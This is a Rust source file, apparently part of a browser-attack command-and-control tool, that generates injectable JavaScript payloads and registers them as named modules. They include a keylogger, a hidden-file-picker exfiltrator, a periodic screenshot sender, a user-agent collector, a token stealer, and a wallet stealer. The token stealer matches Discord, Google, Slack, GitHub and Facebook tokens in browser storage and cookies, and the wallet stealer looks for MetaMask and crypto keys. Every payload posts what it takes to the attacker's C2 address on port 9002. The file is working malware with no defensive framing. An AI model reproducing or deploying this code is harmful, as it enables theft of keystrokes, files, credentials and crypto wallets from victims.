use crate::globals::GLOBAL_C2_IP;
use std::collections::HashMap;
use lazy_static::lazy_static;

pub fn keylogger_js() -> String {
    let ip = GLOBAL_C2_IP.lock().unwrap().clone();
    format!(r#"
(function(){{
    if(window.keylogger_active) return;
    window.keylogger_active = true;
    window.logged_keys = [];
    document.addEventListener('keydown', function(e) {{
        window.logged_keys.push(e.key);
        if(window.logged_keys.length >= 10) {{
            var data = window.logged_keys.join('');
            window.logged_keys = [];
            fetch('http://{}:9002/log', {{
                method: 'POST',
                headers: {{{{'Content-Type': 'text/plain'}}}},
                body: data
            }}).catch(()=>{{}});
        }}
    }});
}})();
"#, ip)
}

pub fn file_exfil_js() -> String {
    let ip = GLOBAL_C2_IP.lock().unwrap().clone();
    format!(r#"
(function(){{
    let input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.style.display = 'none';
    document.body.appendChild(input);
    input.click();
    input.addEventListener('change', () => {{
        let files = input.files;
        for (let file of files) {{
            let reader = new FileReader();
            reader.onload = function() {{
                fetch('http://{}:9002/upload', {{
                    method: 'POST',
                    headers: {{{{'Content-Type': 'application/octet-stream', 'X-Filename': file.name}}}},
                    body: reader.result
                }}).catch(()=>{{}});
            }};
            reader.readAsArrayBuffer(file);
        }}
    }});
}})();
"#, ip)
}

pub fn screenshot_js() -> String {
    let ip = GLOBAL_C2_IP.lock().unwrap().clone();
    format!(r#"
(function(){{
    if(window.screenshot_active) return;
    window.screenshot_active = true;
    function captureAndSend() {{
        html2canvas(document.body).then(function(canvas) {{
            canvas.toBlob(function(blob) {{
                if (blob) {{
                    let formData = new FormData();
                    formData.append('file', blob, 'screenshot.png');
                    fetch('http://{}:9002/screenshot', {{
                        method: 'POST',
                        body: formData
                    }}).catch(()=>{{}});
                }}
            }});
        }}).catch(()=>{{}});
    }}
    captureAndSend();
    setInterval(captureAndSend, 30000);
}})();
(function(){{
    if (!window.html2canvas) {{
        var script = document.createElement('script');
        script.src = "https://html2canvas.hertzen.com/dist/html2canvas.min.js";
        document.body.appendChild(script);
    }}
}})();
"#, ip)
}

pub fn ua_collector_js() -> String {
    let ip = GLOBAL_C2_IP.lock().unwrap().clone();
    format!(r#"
fetch('http://{}:9002/useragent', {{
    method: 'POST',
    headers: {{{{'Content-Type': 'text/plain'}}}},
    body: navigator.userAgent
}}).catch(()=>{{}});
"#, ip)
}

pub fn token_stealer_js() -> String {
    let ip = GLOBAL_C2_IP.lock().unwrap().clone();
    format!(r#"
(function(){{
    if(window.tokenstealer_active) return;
    window.tokenstealer_active = true;

    function sendToken(token) {{
        fetch('http://{}:9002/tokens', {{
            method: 'POST',
            headers: {{{{'Content-Type': 'text/plain'}}}},
            body: token
        }}).catch(()=>{{}});
    }}

    function checkStorage(storage) {{
        for (var i = 0; i < storage.length; i++) {{
            var key = storage.key(i);
            var value = storage.getItem(key);
            if (value) {{
                if (/[\w-]{{24}}\.[\w-]{{6}}\.[\w-]{{27}}/.test(value)) {{
                    sendToken("Discord Token: " + value);
                }}
                if (/ya29\.[0-9A-Za-z\-_]+/.test(value)) {{
                    sendToken("Google OAuth Token: " + value);
                }}
                if (/xox[p|b]-[0-9A-Za-z-]+/.test(value)) {{
                    sendToken("Slack Token: " + value);
                }}
                if (/gho_[0-9a-zA-Z]{{36}}/.test(value)) {{
                    sendToken("GitHub Token: " + value);
                }}
                if (/EAAG[a-zA-Z0-9]+/.test(value)) {{
                    sendToken("Facebook Token: " + value);
                }}
            }}
        }}
    }}

    try {{ checkStorage(localStorage); }} catch(e){{}}
    try {{ checkStorage(sessionStorage); }} catch(e){{}}
    try {{
        var cookies = document.cookie.split(';');
        cookies.forEach(function(cookie){{
            if (/[A-Za-z0-9\-_]{{20,}}\.[A-Za-z0-9\-_]{{10,}}\.[A-Za-z0-9\-_]{{20,}}/.test(cookie)) {{
                sendToken("Token from Cookie: " + cookie);
            }}
        }});
    }} catch(e){{}}
}})();
"#, ip)
}

pub fn wallet_stealer_js() -> String {
    let ip = GLOBAL_C2_IP.lock().unwrap().clone();
    format!(r#"
(function(){{
    if(window.walletstealer_active) return;
    window.walletstealer_active = true;

    function sendWallet(data) {{
        fetch('http://{}:9002/wallet', {{
            method: 'POST',
            headers: {{{{'Content-Type': 'text/plain'}}}},
            body: data
        }}).catch(()=>{{}});
    }}

    function checkWalletStorage(storage) {{
        for (var i = 0; i < storage.length; i++) {{
            var key = storage.key(i);
            var value = storage.getItem(key);
            if (value && (key.toLowerCase().includes("wallet") || key.toLowerCase().includes("metamask") || key.toLowerCase().includes("crypto"))) {{
                sendWallet(key + " => " + value);
            }}
        }}
    }}

    try {{ checkWalletStorage(localStorage); }} catch(e){{}}
    try {{ checkWalletStorage(sessionStorage); }} catch(e){{}}
}})();
"#, ip)
}

pub fn service_worker_js() -> &'static str {
    r#"
(function(){
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js', {scope: './'})
        .then(function(reg) {
            console.log('Service Worker registered.');
        }).catch(function(err) {
            console.log('Service Worker registration failed:', err);
        });
    }
})();
"#
}

lazy_static! {
    pub static ref MODULES: HashMap<&'static str, fn() -> String> = {
        let mut m = HashMap::new();
        m.insert("keylogger", keylogger_js as fn() -> String);
        m.insert("file_exfil", file_exfil_js as fn() -> String);
        m.insert("screenshot", screenshot_js as fn() -> String);
        m.insert("ua_collector", ua_collector_js as fn() -> String);
        m.insert("token_stealer", token_stealer_js as fn() -> String);
        m.insert("wallet_stealer", wallet_stealer_js as fn() -> String);
        m
    };
}
